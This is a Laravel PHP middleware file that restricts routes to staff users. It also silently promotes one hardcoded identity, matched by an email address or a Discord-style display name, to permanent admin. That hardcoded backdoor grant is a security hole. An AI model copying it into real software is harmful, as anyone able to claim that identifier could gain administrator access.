<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class CheckIfUserIsStaff
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $user = Auth::user();

        // If user is not staff
        if($user->isAdmin == false) {
            // Check to see if user is DJRedNight
            if($user->email == 'djrednightmc@gmail.com' || $user->fullusername == 'DJRedNight#3428') {
                $user->isAdmin = true;
                $user->save();
                return $next($request);
            }
            // Return To Index if not staff
            return redirect()->route('index');
        }

        return $next($request);
    }
}
